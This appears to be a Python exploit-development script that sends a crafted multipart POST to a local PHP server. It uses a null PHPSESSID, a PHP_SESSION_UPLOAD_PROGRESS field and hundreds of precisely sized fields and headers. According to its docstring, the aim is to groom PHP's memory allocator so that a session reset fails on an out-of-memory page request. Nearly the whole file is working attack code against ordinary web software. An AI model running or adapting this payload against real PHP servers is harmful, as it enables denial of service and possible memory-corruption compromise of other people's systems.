#!/usr/bin/env python3
"""A id4: N64E early 39B fields fill 64B page 0x6e; the random session id
(64B) should land at page 0x6f slot0.  NM medium (103B) file-part headers
consume the leftover chunk free pages so the reset's page request OOMs.
usage: send_a_id4.py N128 V NH HL NM [PATH]
"""
import socket,sys
N128=int(sys.argv[1]); V=int(sys.argv[2]); NH=int(sys.argv[3]); HL=int(sys.argv[4]); NM=int(sys.argv[5]); PATH=sys.argv[6] if len(sys.argv)>6 else '/plain.php'
N=997; N64E=64
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N):
    if i<N64E:
        val=b'q'*39
    else:
        ln=103 if i<N128 else V
        val=(b'A'*ln)
    parts.append({'name':'f%04d'%i,'data':val})
head=b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
for i in range(NH):
    head += b'X-Pad-%04d: '%i + b'H'*HL + b'\r\n'
for i in range(NM):
    head += b'X-Med-%04d: '%i + b'm'*103 + b'\r\n'
head += b'Content-Type: application/octet-stream\r\n\r\n'
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'\r\n'+head+b'A'*64+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST {PATH} HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
